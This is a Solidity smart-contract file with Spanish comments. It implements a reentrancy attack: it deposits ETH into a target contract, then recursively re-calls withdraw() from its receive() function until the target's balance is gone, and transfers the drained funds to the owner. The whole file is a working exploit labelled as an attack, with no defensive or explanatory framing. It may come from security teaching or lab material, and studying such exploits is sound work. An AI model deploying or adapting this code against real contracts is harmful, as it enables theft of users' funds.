// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ITokenReentrancy {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    ITokenReentrancy public target;
    address public owner;

    constructor(address _target) {
        target = ITokenReentrancy(_target);
        owner = msg.sender;
    }

    // Iniciar ataque depositando un fondo inicial
    function attack() public payable {
        require(msg.sender == owner, "Not owner");
        target.deposit{value: msg.value}(); // Depositar saldo inicial
        target.withdraw();  // Disparar la vulnerabilidad de reentrancy
    }

    // Recibir ETH del Withdraw y volver a llamar withdraw() antes de que se actualice el saldo
    receive() external payable {
        if (address(target).balance > 0) { 
            target.withdraw();
        } else {
            payable(owner).transfer(address(this).balance); // Retirar fondos
        }
    }
}